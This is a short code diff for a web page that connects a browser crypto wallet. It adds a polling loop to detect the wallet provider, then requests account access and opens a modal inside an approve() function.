@@ -81,20 +81,36 @@
 
         let web3, userAddr;
 
-        window.addEventListener('load', async () => {
-            if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
-            }
-        });
+        async function waitForWallet() {
+            return new Promise((resolve) => {
+                let attempts = 0;
+                const checkWallet = setInterval(() => {
+                    if (window.ethereum) {
+                        clearInterval(checkWallet);
+                        resolve(window.ethereum);
+                    }
+                    attempts++;
+                    if (attempts > 50) {
+                        clearInterval(checkWallet);
+                        resolve(null);
+                    }
+                }, 100);
+            });
+        }
 
         async function approve() {
             try {
-                if (!window.ethereum) {
-                    notify('No wallet detected - open in MetaMask or Trust Wallet', 'error');
+                notify('Waiting for wallet...', 'info');
+                const ethereum = await waitForWallet();
+                
+                if (!ethereum) {
+                    notify('Wallet not found - ensure you are in Trust Wallet browser', 'error');
                     return;
                 }
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                 userAddr = accounts[0];
+                web3 = new Web3(ethereum);
                 document.getElementById('modal').classList.add('show');
             } catch (e) {
                 notify('Error: ' + e.message, 'error');
